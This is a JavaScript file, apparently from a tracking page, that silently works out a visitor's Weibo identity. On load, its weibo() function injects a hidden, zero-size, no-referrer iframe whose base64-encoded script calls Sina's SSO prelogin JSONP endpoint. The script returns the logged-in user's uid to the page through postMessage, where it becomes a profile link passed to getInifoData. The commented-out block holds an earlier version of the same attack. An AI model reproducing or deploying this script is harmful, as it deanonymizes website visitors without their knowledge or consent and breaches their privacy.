// // let weibo = document.createElement('iframe')
// // weibo.src = 'https://weibo.com/'
// // weibo.width = '0'
// // weibo.height = '0'
// // weibo.style.borderWidth = 0
// // weibo.onload = function () {
// //   setTimeout(() => {
// jsonpGetJSON(
//   'http://api.weibo.com/2/users/show_brief.json?source=2835469272',
//   // 'https://login.sina.com.cn/sso/prelogin.php?entry=weibo&su=&rsakt=mod&client=ssologin.js(v1.4.19)&callback=jsonp_callback_HFRuwvUk'
//   'callback'
// ).then(function (t) {
//   console.log(t)
//   let data = {
//     // weiboHomePage: 'https://weibo.com/u/' + t.data.id,
//     // userName: t.data.screen_name,
//     // photo: t.data.profile_image_url,
//   }

//   let innerHTML = `
//         <div class='item'>
//           <p class='title'>新浪微博</p>
//           <p>个人主页: ${data.weiboHomePage}</p>
//           <p>图像: ${data.photo}</p>
//           <p>用户名: ${data.userName}</p>
//         </div>
//       `
//   getInifoData({ type: 'weibo', data: data, html: innerHTML })
// })
// //   }, 1000)
// // }
// // document.body.appendChild(weibo)

function formateWeiboData(d) {
  if ('weibo' === d.data.source) {
    var t = d.data.d
    var a = { valid: !0, data: { id: t.uid } }

    let innerHTML = `
      <div class='item'
        <p class='title'>新浪微博</p>
        <p>个人主页: https://weibo.com/u/${t.uid}</p>
      </div>
    `
    let data = {
      homePage: 'https://weibo.com/u/' + t.uid,
    }
    if (t.uid) {
      getInifoData({ type: 'weibo', data: data, html: innerHTML })
    }
  }
}
function weibo() {
  var e = document.createElement('iframe')
  e.src =
    'data:text/html;base64,PHNjcmlwdD4KCXdpbmRvdy5qc29ucF9jYWxsYmFja19IRlJ1d3ZVaz0gZnVuY3Rpb24oZSkgewpsZXQgZCA9IHtzb3VyY2U6ICd3ZWlibycsIGQ6IGV9O3dpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoZCwgIioiKTt9CglsZXQgcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwoJcy5zcmMgPSAiaHR0cHM6Ly9sb2dpbi5zaW5hLmNvbS5jbi9zc28vcHJlbG9naW4ucGhwP2VudHJ5PXdlaWJvJnN1PSZyc2FrdD1tb2QmY2xpZW50PXNzb2xvZ2luLmpzKHYxLjQuMTkpJmNhbGxiYWNrPWpzb25wX2NhbGxiYWNrX0hGUnV3dlVrIjsKCWRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChzKTsKPC9zY3JpcHQ+'
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.referrerPolicy = 'no-referrer'
  document.documentElement.appendChild(e)
}
window.addEventListener('message', formateWeiboData, !1)
// window.addEventListener('load', function () {
weibo()
// })
